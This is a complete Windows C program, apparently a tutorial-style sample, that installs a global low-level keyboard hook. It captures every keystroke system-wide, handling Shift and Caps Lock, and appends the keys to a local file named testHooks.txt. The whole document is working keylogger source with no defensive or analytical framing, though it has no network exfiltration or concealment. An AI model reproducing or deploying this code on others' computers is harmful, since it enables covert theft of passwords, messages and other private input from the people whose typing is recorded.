#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment( lib, "user32.lib") 
#pragma comment( lib, "gdi32.lib")

HHOOK _hook;
HANDLE hFile; 
BOOL shiftIsHeld = FALSE;
BOOL capsLockActivated = FALSE;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;
 
// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
        DWORD dwBytesToWrite;
        DWORD dwBytesWritten;
        BOOL bErrorFlag = FALSE;
        char keyString[20];
		// the action is valid: HC_ACTION.
        if (wParam == WM_KEYUP)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            if (kbdStruct.vkCode == VK_SHIFT || kbdStruct.vkCode == VK_LSHIFT || kbdStruct.vkCode == VK_RSHIFT)
                shiftIsHeld = FALSE;
        }
		else if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            // Special cases
            switch (kbdStruct.vkCode)
            {
            case VK_ESCAPE:
                strcpy_s(keyString, sizeof keyString, "ESC");
                break;
            case VK_RETURN:
                strcpy_s(keyString, sizeof keyString, "RETURN");
                break;
            case VK_TAB:
                strcpy_s(keyString, sizeof keyString, "TAB");
                break;
            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:
                strcpy_s(keyString, sizeof keyString, "CTRL");
                break;
            case VK_MENU:
            case VK_LMENU:
            case VK_RMENU:
                strcpy_s(keyString, sizeof keyString, "ALT");
                break;
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
                strcpy_s(keyString, sizeof keyString, "SHIFT");
                shiftIsHeld = TRUE;
                break;
            case VK_CAPITAL:
                strcpy_s(keyString, sizeof keyString, "CAPS_LOCK");
                capsLockActivated = !capsLockActivated;
                break;
            case VK_BACK:
                strcpy_s(keyString, sizeof keyString, "BACK");
                break;
            default:
                char c = kbdStruct.vkCode;
                BOOL useUpperCase = (shiftIsHeld && !capsLockActivated) || (!shiftIsHeld && capsLockActivated);
                if (!useUpperCase)
                {
                    c = tolower(c);
                }
                keyString[0] = c;
                keyString[1] = '\0';
                break;
            }

            dwBytesToWrite = strlen(keyString);
            dwBytesWritten = 0;
            bErrorFlag = WriteFile( 
                            hFile,
                            keyString,
                            dwBytesToWrite,
                            &dwBytesWritten,
                            NULL);

            if (FALSE == bErrorFlag)
            {
                printf("Terminal failure: Unable to write to file.\n");
            }
            else
            {
                if (dwBytesWritten != dwBytesToWrite)
                {
                    printf("Error: dwBytesWritten != dwBytesToWrite\n");
                }
            }
		}
	}
 
	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}
 
void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}
 
void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}
 
void main(int argc, TCHAR *argv[])
{
    // Try to create file
    hFile = CreateFile("testHooks.txt",      
                       GENERIC_WRITE,        
                       0,                   
                       NULL,               
                       CREATE_NEW,        
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);

    // If we could not try to edit it
    if (hFile == INVALID_HANDLE_VALUE) 
    { 
        hFile = CreateFile("testHooks.txt",
                           FILE_APPEND_DATA,
                           0,              
                           NULL,          
                           OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);               
    }

    // #### creating file #### 
    SetHook();
 
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }


    CloseHandle(hFile);
}